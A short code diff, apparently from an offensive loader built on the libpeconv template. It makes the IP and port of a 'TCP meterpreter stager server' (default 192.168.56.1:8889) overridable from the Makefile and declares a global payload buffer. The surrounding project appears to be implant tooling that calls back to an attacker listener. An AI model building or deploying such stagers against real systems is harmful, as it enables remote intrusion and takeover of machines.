@@ -12,9 +12,13 @@ built from: https://github.com/hasherezade/libpeconv_tpl
 
 #include <peconv.h> // include libPeConv header
 
-/* TCP meterpreter stager server parameters (ip, port) */
+/* TCP meterpreter stager server parameters (ip, port) ::: define in Makefile */
+#ifndef IMPLANT_IP
 #define IMPLANT_IP "192.168.56.1"
+#endif
+#ifndef IMPLANT_PORT
 #define IMPLANT_PORT 8889
+#endif
 
 BYTE* g_Payload = nullptr;
 size_t g_PayloadSize = 0;
